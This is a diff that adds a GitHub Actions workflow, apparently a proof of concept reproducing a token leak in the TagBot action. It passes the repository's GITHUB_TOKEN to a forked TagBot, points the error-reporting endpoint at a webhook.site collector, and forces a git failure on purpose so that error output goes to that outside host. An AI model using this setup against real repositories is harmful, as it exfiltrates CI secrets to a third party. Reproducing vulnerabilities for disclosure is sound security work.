@@ -1,0 +1,17 @@
+name: tagbot-leak-repro
+on: workflow_dispatch
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run forked TagBot to force git failure early
+        uses: yourname/TagBot@<commit-sha>
+        env:
+          TAGBOT_ERROR_ENDPOINT: https://webhook.site/56aa9ff7-330f-45e4-8899-f8fbefb57879
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+          github: invalid.example.com      # 故意错误的主机名，确保克隆失败
+          github_api: api.github.com       # API 仍正常，隐私判断可用
+          ssh: Zm9v                        # 任意内容（Base64），触发一次 Git 配置/操作
